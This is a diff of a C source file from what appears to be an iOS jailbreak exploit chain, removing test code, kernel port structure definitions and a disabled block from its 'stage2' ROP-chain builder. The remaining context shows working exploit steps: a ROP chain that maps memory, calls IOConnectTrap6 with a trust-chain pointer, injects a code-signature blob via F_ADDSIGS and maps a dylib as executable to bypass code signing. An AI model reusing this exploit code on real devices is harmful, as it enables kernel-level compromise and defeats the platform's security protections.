@@ -11,104 +11,6 @@
 #include "stage2.h"
 #include "stage1.h"
 
-// TODO: move those struct definitions into a new file
-typedef uint64_t mach_port_poly_t; // ???
-
-typedef struct {
-	mach_msg_header_t head;
-	mach_msg_body_t msgh_body;
-	mach_msg_ool_ports_descriptor_t desc[1];
-	char pad[4096]; // FIXME: what a waste
-} ool_message_struct;
-
-#pragma pack(4)
-typedef struct {
-    mach_msg_header_t Head;
-    NDR_record_t NDR;
-    uint32_t selector;
-    mach_msg_type_number_t scalar_inputCnt;
-    /*io_user_scalar_t scalar_input[16];*/
-    mach_msg_type_number_t inband_inputCnt;
-    char inband_input[24];
-    mach_vm_address_t ool_input;
-    mach_vm_size_t ool_input_size;
-    mach_msg_type_number_t inband_outputCnt;
-    mach_msg_type_number_t scalar_outputCnt;
-    mach_vm_address_t ool_output;
-    mach_vm_size_t ool_output_size;
-} MEMLEAK_Request __attribute__((unused));
-typedef struct {
-    mach_msg_header_t Head;
-    NDR_record_t NDR;
-    kern_return_t RetCode;
-    mach_msg_type_number_t inband_outputCnt;
-    char inband_output[24];
-    mach_msg_type_number_t scalar_outputCnt;
-    /*io_user_scalar_t scalar_output[16];*/
-    mach_vm_size_t ool_output_size;
-    mach_msg_trailer_t trailer;
-} MEMLEAK_Reply __attribute__((unused));
-#pragma pack()
-
-union {
-    MEMLEAK_Request In;
-    MEMLEAK_Reply Out;
-} MEMLEAK_msg;
-
-typedef volatile struct {
-    uint32_t ip_bits;
-    uint32_t ip_references;
-    struct {
-        kptr_t data;
-        uint32_t type;
-#ifdef __LP64__
-        uint32_t pad;
-#endif
-    } ip_lock; // spinlock
-    struct {
-        struct {
-            struct {
-                uint32_t flags;
-                uint32_t waitq_interlock;
-                uint64_t waitq_set_id;
-                uint64_t waitq_prepost_id;
-                struct {
-                    kptr_t next;
-                    kptr_t prev;
-                } waitq_queue;
-            } waitq;
-            kptr_t messages;
-            uint32_t seqno;
-            uint32_t receiver_name;
-            uint16_t msgcount;
-            uint16_t qlimit;
-#ifdef __LP64__
-            uint32_t pad;
-#endif
-        } port;
-        kptr_t klist;
-    } ip_messages;
-    kptr_t ip_receiver;
-    kptr_t ip_kobject;
-    kptr_t ip_nsrequest;
-    kptr_t ip_pdrequest;
-    kptr_t ip_requests;
-    kptr_t ip_premsg;
-    uint64_t ip_context;
-    uint32_t ip_flags;
-    uint32_t ip_mscount;
-    uint32_t ip_srights;
-    uint32_t ip_sorights;
-} kport_t;
-
-#define IO_BITS_ACTIVE 0x80000000
-#define IOT_PORT 0
-#define IKOT_NONE 0
-#define IKOT_TASK 2
-#define IKOT_IOKIT_CONNECT 29
-#define IKOT_CLOCK 25
-#define NENT 1
-
 
 // TODO: move that whole buidling part into another file and integrate rop_chain_debug into rop_chain
 uint64_t get_rop_var_addr(offset_struct_t * offsets, rop_var_t * ropvars, char * name) {
@@ -619,7 +521,6 @@ void build_databuffer(offset_struct_t * offsets, rop_var_t * ropvars) {
 	}
 }
 
-// TODO: remove the test code
 void stage2(offset_struct_t * offsets,char * base_dir) {
 
 	// TODO: the stage2_databuffer_len should be set in install.m
@@ -630,31 +531,9 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	// let's go
 	INIT_FRAMEWORK(offsets);
 
-
-	
-/*	
-	CALL_FUNC(0x0,0x41,0x42,0x43,0x44,0x45,0x46,0x47,0x48);
-	CALL_FUNC_WITH_RET_SAVE(0x0,0x40,0x41,0x42,0x43,0x44,0x45,0x46,0x47,0x48);
-	uint64_t * test = malloc(sizeof(uint64_t));
-	*test = 10;
-	DEFINE_ROP_VAR("test",8,test);
-	SET_ROP_VAR64("test",14);
-	DEFINE_ROP_VAR("test2",8,test);
-	ROP_VAR_CPY("test","test2",8);
-	CALL_FUNC_RET_SAVE_VAR("test",0x40,0x41,0x42,0x43,0x44,0x45,0x46,0x47,0x48);
-	ADD_COMMENT("var/arg test");
-	ROP_VAR_ARG("test",1);
-	CALL_FUNC_RET_SAVE_VAR("test",0x40,0x41,0x42,0x43,0x44,0x45,0x46,0x47,0x48);
-	*/
-
 #define CALL(name,arg1,arg2,arg3,arg4,arg5,arg6,arg7,arg8) \
 	ADD_COMMENT(name); \
 	CALL_FUNC(get_addr_from_name(offsets,name),arg1,arg2,arg3,arg4,arg5,arg6,arg7,arg8);
-
-	char * buf[1024];
-	memset(buf,0,sizeof(buf));
-	snprintf(buf,sizeof(buf),"testing...");
-	DEFINE_ROP_VAR("test_string",sizeof(buf),buf);
 
 	char * tmp = malloc(0x2000);
 	memset(tmp,0,0x2000);
@@ -663,213 +542,9 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	// map the memory it uses
 	CALL("__mmap",offsets->errno_offset & ~0x3fff, 0x4000, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0,0,0,0);
 
+	// this is here to fix a crash in mach_msg tho I have no idea what is accessed there, just mapping the page gets it running tho
 	CALL("__mmap",offsets->mach_msg_offset & ~0x3fff, 0x4000, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0,0,0,0);
 
-#if 0
-
-	char * dylib_str = malloc(100);
-	snprintf(dylib_str,100,"/usr/sbin/racoon.dylib");
-	DEFINE_ROP_VAR("dylib_str",100,dylib_str);
-
-	/*
-	// ghetto dlopen
-	// get a file descriptor for that dylib
-	DEFINE_ROP_VAR("dylib_fd",8,&buf);
-	ROP_VAR_ARG_HOW_MANY(1);
-	ROP_VAR_ARG("dylib_str",1);
-	CALL_FUNC_RET_SAVE_VAR("dylib_fd",get_addr_from_name(offsets,"open"),0,O_RDONLY,0,0,0,0,0,0);
-	// add codesignature to the vnode
-	// mmap the blob
-	ROP_VAR_ARG_HOW_MANY(1);
-	ROP_VAR_ARG64("dylib_fd",5);
-	CALL("__mmap",offsets->stage3_loadaddr,offsets->stage3_size,PROT_READ|PROT_WRITE,MAP_FIXED|MAP_PRIVATE,0,0,0,0);
-	fsignatures_t * siginfo = malloc(sizeof(fsignatures_t));
-	memset(siginfo,0,sizeof(fsignatures_t));
-	siginfo->fs_blob_start = offsets->stage3_loadaddr + offsets->stage3_CS_blob;
-	siginfo->fs_blob_size = offsets->stage3_CS_blob_size;
-	DEFINE_ROP_VAR("siginfo",sizeof(fsignatures_t),siginfo);
-	ROP_VAR_ARG_HOW_MANY(2);
-	ROP_VAR_ARG64("dylib_fd",1);
-	ROP_VAR_ARG("siginfo",3);
-	CALL_FUNC(offsets->fcntl_raw_syscall,0,F_ADDSIGS,0,0,0,0,0,0);
-	// map it at a fixed address (this will smash the blob)
-	ROP_VAR_ARG_HOW_MANY(1);
-	ROP_VAR_ARG64("dylib_fd",5);
-	CALL("__mmap",offsets->stage3_loadaddr,offsets->stage3_size,PROT_EXEC|PROT_READ,MAP_FIXED|MAP_PRIVATE,0,offsets->stage3_fileoffset,0,0);
-	// jump
-	CALL_FUNCTION_NO_SLIDE(offsets->BEAST_GADGET,offsets->stage3_jumpaddr,0xdeadbeef,get_addr_from_name(offsets,"write")-0x180000000+offsets->new_cache_addr,0,0,0,0,0,0);
-
-	*/
-
-
-	/*
-	CALL("seteuid",501,0,0,0,0,0,0,0); 
-	CALL("seteuid",0,0,0,0,0,0,0,0); 
-
-	DEFINE_ROP_VAR("swapprefix_buffer",1024,&buf);
-	DEFINE_ROP_VAR("swapprefix_length",sizeof(uint64_t),&buf);
-	SET_ROP_VAR64("swapprefix_length",0);
-	// using undocumented magic to get the integer name of vm.swapfileprefix
-	char * name = "vm.swapfileprefix";
-	int name2oid[2];
-	name2oid[0] = 0;
-	name2oid[1] = 3;
-	int * real_oid = malloc(CTL_MAXNAME+2);
-	size_t oidlen = CTL_MAXNAME+2;
-	if (sysctl(name2oid,2,real_oid,&oidlen,name,strlen(name)) != 0) {LOG("OHNO");}
-	DEFINE_ROP_VAR("swapprefix_oid",oidlen,real_oid);
-	ROP_VAR_ARG_HOW_MANY(3);
-	ROP_VAR_ARG("swapprefix_oid",1);
-	ROP_VAR_ARG("swapprefix_buffer",3);
-	ROP_VAR_ARG("swapprefix_length",4);
-	CALL("sysctl",0,oidlen/4,0,0,0,0,0,0);
-	ROP_VAR_ARG_HOW_MANY(2);
-	ROP_VAR_ARG("swapprefix_oid",1);
-	ROP_VAR_ARG("swapprefix_buffer",5);
-	CALL("sysctl",0,oidlen/4,0,0,100,0,0,0);
-
-
-
-	*/
-
-	DEFINE_ROP_VAR("reply_port",sizeof(mach_port_t),&buf);
-	CALL_FUNC_RET_SAVE_VAR("reply_port",get_addr_from_name(offsets,"mach_reply_port"),0,0,0,0,0,0,0,0);
-	/*
-	DEFINE_ROP_VAR("a",8,&buf);
-	DEFINE_ROP_VAR("b",8,&buf);
-	ROP_VAR_ADD("a","a","b");
-
-	struct __sigaction * myaction = malloc(sizeof(struct __sigaction));
-	memset(myaction,0,sizeof(struct __sigaction));
-	myaction->sa_handler = offsets->rop_nop-0x180000000+offsets->new_cache_addr;
-	myaction->sa_tramp = get_addr_from_name(offsets,"_sigtramp")-0x180000000+offsets->new_cache_addr; //offsets->longjmp-0x180000000+offsets->new_cache_addr;
-	myaction->sa_mask = (1 << (SIGWINCH-1));
-	DEFINE_ROP_VAR("my_action",sizeof(struct __sigaction),myaction);
-	ROP_VAR_ARG_HOW_MANY(1);
-	ROP_VAR_ARG("my_action",2);
-	CALL("__sigaction",SIGWINCH,0,0,0,0,0,0,0);
-*/
-    DEFINE_ROP_VAR("mach_host",sizeof(mach_port_t),tmp);
-    CALL_FUNC_RET_SAVE_VAR("mach_host",get_addr_from_name(offsets,"mach_host_self"),0,0,0,0,0,0,0,0);
-
-    DEFINE_ROP_VAR("master_port",sizeof(mach_port_t),tmp);
-    ROP_VAR_ARG_HOW_MANY(2);
-    ROP_VAR_ARG64("mach_host",1);
-    ROP_VAR_ARG("master_port",2);
-    CALL("host_get_io_master",0,0,0,0,0,0,0,0);
-
-    // implementing IOServiceGetMatchingService
-    CFMutableDictionaryRef myservice_dict = IOServiceMatching("IODTNVRAM");
-    CFDataRef myservice_serialized = IOCFSerialize(myservice_dict, kIOCFSerializeToBinary /*gIOKitLibSerializeOptions*/);
-    CFRelease(myservice_dict);
-    uint64_t data_length = CFDataGetLength(myservice_serialized);
-
-    // TODO: move those structs into a seperate file
-    struct GetMatchingService_Request {
-        mach_msg_header_t Head;
-        NDR_record_t NDR;
-        mach_msg_type_number_t matchingCnt;
-        char matching[4096];
-    };
-
-    struct GetMatchingService_Reply {
-        mach_msg_header_t Head;
-        mach_msg_body_t body;
-        mach_msg_port_descriptor_t service;
-        mach_msg_trailer_t trailer;
-    };
-
-    struct GetMatchingService_Request * service_request = malloc(sizeof(struct GetMatchingService_Request));
-    memset(service_request,0,sizeof(struct GetMatchingService_Request));
-    service_request->NDR = NDR_record;
-    service_request->Head.msgh_bits = MACH_MSGH_BITS(19,MACH_MSG_TYPE_MAKE_SEND_ONCE);
-    service_request->Head.msgh_id = 2880;
-    service_request->Head.msgh_reserved = 0;
-    service_request->matchingCnt = data_length;
-    memcpy(service_request->matching,CFDataGetBytePtr(myservice_serialized),data_length);
-
-    DEFINE_ROP_VAR("service_request",sizeof(struct GetMatchingService_Request),service_request);
-    ROP_VAR_CPY_W_OFFSET("service_request",offsetof(struct GetMatchingService_Request,Head.msgh_local_port),"reply_port",0,sizeof(mach_port_t));
-    ROP_VAR_CPY_W_OFFSET("service_request",offsetof(struct GetMatchingService_Request,Head.msgh_remote_port),"master_port",0,sizeof(mach_port_t));
-
-    ROP_VAR_ARG_HOW_MANY(2);
-    ROP_VAR_ARG("service_request",1);
-    ROP_VAR_ARG64("reply_port",5);
-    CALL("mach_msg",0,MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, sizeof(struct GetMatchingService_Request)-4096+((data_length+3) & ~3), sizeof(struct GetMatchingService_Reply), 0, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL,0);
-
-	DEFINE_ROP_VAR("service",sizeof(mach_port_t),tmp);
-
-    ROP_VAR_CPY_W_OFFSET("service",0,"service_request",offsetof(struct GetMatchingService_Reply,service.name),sizeof(mach_port_t));
-
-
-	struct get_property_request {
-		mach_msg_header_t Head;
-		NDR_record_t NDR;
-		mach_msg_type_number_t property_nameOffset;
-		mach_msg_type_number_t property_nameCnt;
-		char property_name[12];
-		mach_msg_type_number_t dataCnt;
-	};
-
-	struct get_property_reply {
-		mach_msg_header_t Head;
-		NDR_record_t NDR;
-		kern_return_t RetCode;
-		mach_msg_type_number_t dataCnt;
-		char data[4096];
-		mach_msg_trailer_t trailer;
-	};
-
-	union get_property_union {
-		struct get_property_request request;
-		struct get_property_reply reply;
-	};
-
-	union get_property_union * get_property_msg = malloc(sizeof(union get_property_union));
-	memset(get_property_msg,0,sizeof(union get_property_union));
-
-	get_property_msg->request.NDR = NDR_record;
-	get_property_msg->request.Head.msgh_bits = MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
-    get_property_msg->request.Head.msgh_reserved = 0;
-	get_property_msg->request.Head.msgh_id = 2812;
-	get_property_msg->request.dataCnt = 4096;
-	snprintf(&get_property_msg->request.property_name,12,"boot-args");
-	get_property_msg->request.property_nameCnt = strlen(&get_property_msg->request.property_name);
-
-	DEFINE_ROP_VAR("get_property_msg",sizeof(union get_property_union),get_property_msg);
-	ROP_VAR_CPY_W_OFFSET("get_property_msg",offsetof(union get_property_union,request.Head.msgh_local_port),"reply_port",0,sizeof(mach_port_t));
-	ROP_VAR_CPY_W_OFFSET("get_property_msg",offsetof(union get_property_union,request.Head.msgh_remote_port),"service",0,sizeof(mach_port_t));
-																																																									
-	ROP_VAR_ARG_HOW_MANY(2);
-	ROP_VAR_ARG("get_property_msg",1);
-	ROP_VAR_ARG64("reply_port",5);
-	CALL("mach_msg",0,MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, sizeof(struct get_property_request), sizeof(struct get_property_reply),0, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL,0);
-
-
-	char * cmp_str = malloc(100);
-	snprintf(cmp_str,100,"this boy needs some milk");
-	DEFINE_ROP_VAR("cmp_str",100,cmp_str);
-	DEFINE_ROP_VAR("strcmp_retval",8,tmp);
-	ROP_VAR_ARG_HOW_MANY(2);
-	ROP_VAR_ARG("cmp_str",1);
-	ROP_VAR_ARG_W_OFFSET("get_property_msg",2,offsetof(struct get_property_reply,data));
-	CALL_FUNC_RET_SAVE_VAR("strcmp_retval",get_addr_from_name(offsets,"strcmp"),0,0,0,0,0,0,0,0);
-
-	ADD_LOOP_START("test_loop")
-		ROP_VAR_ARG_HOW_MANY(1);
-		ROP_VAR_ARG("dylib_str",2);
-		CALL("write",1,0,1024,0,0,0,0,0);
-
-
-		
-		// set x0 to the_one
-		SET_X0_FROM_ROP_VAR("strcmp_retval");
-		// break out of the loop if x0 is nonzero
-		ADD_LOOP_BREAK_IF_X0_NONZERO("test_loop");
-	ADD_LOOP_END();
-#else
-
-	
 	// SETUP VARS
 	// TODO: replace tmp with NULL and let the framework handle it
 	DEFINE_ROP_VAR("should_race",sizeof(uint64_t),tmp); //
@@ -1504,16 +1179,6 @@ _STRUCT_ARM_THREAD_STATE64
 	ROP_VAR_ARG64("bss_trust_chain_head_ptr",3);
 	CALL("IOConnectTrap6",0,0,0,8,0,0,0,0);
 
-	// fixup fakeport so that in case we crash the system remains stable
-	/*
-    SET_ROP_VAR64_W_OFFSET("fakeport",0,offsetof(kport_t,ip_bits));
-    SET_ROP_VAR64_W_OFFSET("fakeport",0,offsetof(kport_t,ip_kobject));
-    ROP_VAR_ARG_HOW_MANY(2);
-    ROP_VAR_ARG64("self",1)
-    ROP_VAR_ARG64("the_one",2);
-    CALL("mach_port_deallocate",0,0,0,0,0,0,0,0);
-	*/
-
 	// ghetto dlopen
 	// get a file descriptor for that dylib
 	DEFINE_ROP_VAR("dylib_fd",8,tmp);
@@ -1751,7 +1416,6 @@ _STRUCT_ARM_THREAD_STATE64
 	ADD_LOOP_START("endless_thread_loop");
 		ADD_USLEEP(10000000);
 	ADD_LOOP_END();
-#endif
 
 	if (curr_rop_var != NULL) {
 		build_databuffer(offsets,rop_var_top);
